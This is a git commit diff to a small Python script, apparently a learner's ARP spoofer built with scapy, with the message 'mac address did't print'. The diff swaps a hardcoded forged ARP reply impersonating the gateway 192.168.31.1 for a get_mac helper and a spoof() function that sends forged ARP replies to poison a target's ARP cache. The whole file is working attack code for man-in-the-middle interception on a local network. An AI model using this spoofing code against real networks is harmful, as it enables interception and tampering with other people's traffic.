fdd1a176ba74eee9c8acd38a553b9d0d33b59a2e
jakiiii <me.jaki@outlook.com>
2018-10-28 04:27:17 +0600

    mac address did't print

--- arp_spoofer/arp_spoof.py
+++ arp_spoofer/arp_spoof.py
@@ -1,10 +1,20 @@
 # !/user/bin/python3
 import scapy.all as scapy
 
-paket = scapy.ARP(
-    op=2,
-    pdst="192.168.31.147",
-    hwsrc="88:78:73:30:1C:95",
-    psrc="192.168.31.1")
 
-scapy.send(paket)
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    print(answered_list[0][1].hwsrc)
+
+
+def spoof(target_ip, spoof_ip):
+    paket = scapy.ARP(
+        op=2, pdst=target_ip, hwsrc="88:78:73:30:1C:95", psrc=spoof_ip)
+    scapy.send(paket)
+
+
+get_mac("ip address")
